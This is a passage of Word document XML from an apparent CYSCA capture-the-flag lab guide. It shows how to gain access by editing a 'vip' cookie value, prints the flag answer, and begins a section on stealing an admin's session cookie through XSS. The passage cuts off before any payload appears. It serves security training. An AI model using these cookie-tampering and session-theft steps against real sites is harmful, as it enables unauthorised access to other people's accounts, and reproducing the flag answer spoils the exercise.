    </w:p>
    <w:p w14:paraId="3293CF82" w14:textId="77777777" w:rsidR="004275B4" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1004"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="447D307C">
          <v:shape id="_x0000_i1035" type="#_x0000_t75" style="width:255.55pt;height:207.25pt;visibility:visible">
            <v:imagedata r:id="rId18" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8C884A" w14:textId="77777777" w:rsidR="00B611E4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00B611E4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Click OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09556577" w14:textId="77777777" w:rsidR="00B611E4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00B611E4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Scroll down to the Cookie Jar, and click Open Cookie Jar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C222CF8" w14:textId="77777777" w:rsidR="004275B4" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1004"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="11B9E256">
          <v:shape id="_x0000_i1036" type="#_x0000_t75" style="width:415.75pt;height:233.9pt;visibility:visible">
            <v:imagedata r:id="rId19" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="3623FC69" w14:textId="77777777" w:rsidR="00B611E4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00B611E4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Select the vip parameter and click Edit</w:t>
      </w:r>
      <w:r w:rsidR="00B00123" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D972B94" w14:textId="77777777" w:rsidR="00B611E4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00B611E4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Change the value from 0 to 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6F81AA" w14:textId="77777777" w:rsidR="004275B4" w:rsidRPr="00FA4E5F" w:rsidRDefault="00000000" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1004"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:pict w14:anchorId="232CB631">
          <v:shape id="_x0000_i1037" type="#_x0000_t75" style="width:245.95pt;height:148.6pt;visibility:visible">
            <v:imagedata r:id="rId20" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCE39BE" w14:textId="77777777" w:rsidR="00F67DB7" w:rsidRPr="00FA4E5F" w:rsidRDefault="00FF5635" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidR="00B00123" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">OK, </w:t>
      </w:r>
      <w:r w:rsidR="00F67DB7" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Close</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7589DF79" w14:textId="77777777" w:rsidR="00FF5635" w:rsidRPr="00FA4E5F" w:rsidRDefault="00FF5635" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Back in </w:t>
      </w:r>
      <w:r w:rsidR="004275B4" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r w:rsidR="00702411" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> of Kali</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F67DB7" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>refresh the page</w:t>
      </w:r>
      <w:r w:rsidR="00785006" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (F5)</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454F20AA" w14:textId="77777777" w:rsidR="00F67DB7" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F67DB7" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>The Blog tab is now available.</w:t>
      </w:r>
      <w:r w:rsidR="00B00123" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Click on it. </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CA4DA6" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>What is</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> the flag</w:t>
      </w:r>
      <w:r w:rsidR="00E75062" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> Shown</w:t>
      </w:r>
      <w:r w:rsidR="00CA4DA6" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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8"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w14:paraId="5D810D7F" w14:textId="77777777" w:rsidTr="00FA4E5F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8522" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w14:paraId="07A4EF68" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E75062" w:rsidP="00FA4E5F">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                <w:color w:val="FF0000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FA4E5F">
              <w:rPr>
                <w:rFonts w:ascii="Comic Sans MS" w:hAnsi="Comic Sans MS"/>
                <w:i/>
                <w:color w:val="FF0000"/>
              </w:rPr>
              <w:t>ComplexKillingInverse411</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3AEF9B20" w14:textId="77777777" w:rsidR="00E75062" w:rsidRPr="00FA4E5F" w:rsidRDefault="00E75062" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="151EFA3D" w14:textId="77777777" w:rsidR="00AB4990" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="00B050"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict w14:anchorId="05562B14">
          <v:shape id="_x0000_i1038" type="#_x0000_t75" style="width:344.6pt;height:185.6pt;visibility:visible">
            <v:imagedata r:id="rId21" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6072A0F1" w14:textId="77777777" w:rsidR="00785006" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>The above is an example of the Cookie Hijacking result – in which it allow us to enter as a Login User to the Web site without registration or any account.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289532E4" w14:textId="77777777" w:rsidR="003B42FF" w:rsidRPr="00FA4E5F" w:rsidRDefault="003B42FF" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>The VIP Flag is just an automated respond or label built-in inside CYSCA web server. In real life it is not this way, attacker simply able to enter the Blog page without login.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECE1989" w14:textId="77777777" w:rsidR="00DD5C7B" w:rsidRPr="00FA4E5F" w:rsidRDefault="00DD5C7B" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43B68C43" w14:textId="77777777" w:rsidR="00785006" w:rsidRPr="00FA4E5F" w:rsidRDefault="00785006" w:rsidP="003B42FF">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Part 2: XSS SessionID stealing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2FCAF8" w14:textId="77777777" w:rsidR="00F050B0" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D8A63C3" w14:textId="77777777" w:rsidR="00F050B0" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>After part 1 above, which allowing us to enter the web site Blog without registration or login. We are now ready for next stage of attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0121F740" w14:textId="77777777" w:rsidR="00F050B0" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F1709B3" w14:textId="77777777" w:rsidR="00F050B0" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Part 1 above must be properly completed first before you can continue.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DBDB65" w14:textId="77777777" w:rsidR="00F050B0" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Before we start:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7C559E" w14:textId="77777777" w:rsidR="00F050B0" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>We are still on Kali for further attack. CYSCA web server still running at the back.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EED7F21" w14:textId="77777777" w:rsidR="00F050B0" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3832FD4A" w14:textId="77777777" w:rsidR="00785006" w:rsidRPr="00FA4E5F" w:rsidRDefault="00785006" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="000000"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="000000"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="000000"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="000000"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E5E5E5"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Now that we can post on the blog page, we can test for and use Cross-site scripting (XSS) to wreak havoc. The clue is:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172BD3BB" w14:textId="77777777" w:rsidR="00785006" w:rsidRPr="00FA4E5F" w:rsidRDefault="001C35C4" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:pict w14:anchorId="55BF575C">
          <v:shape id="_x0000_i1039" type="#_x0000_t75" style="width:205.6pt;height:64.9pt">
            <v:imagedata r:id="rId22" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="07666A3B" w14:textId="77777777" w:rsidR="00785006" w:rsidRPr="00FA4E5F" w:rsidRDefault="00785006" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="284"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">The goal is to steal the session cookie of an admin user using XSS. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F05FCDF" w14:textId="77777777" w:rsidR="00785006" w:rsidRPr="00FA4E5F" w:rsidRDefault="00F050B0" w:rsidP="00E75062">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>On Kali Firefox, b</w:t>
      </w:r>
      <w:r w:rsidR="00785006" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">rowse the </w:t>
      </w:r>
      <w:r w:rsidR="00785006" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>blog</w:t>
      </w:r>
      <w:r w:rsidR="00785006" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> pages at </w:t>
      </w:r>
      <w:r w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>http://192.168</w:t>
      </w:r>
      <w:r w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>.100.210/</w:t>
      </w:r>
      <w:r w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:r w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00A83DA2" w:rsidRPr="00FA4E5F">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">The heading </w:t>
      </w:r>
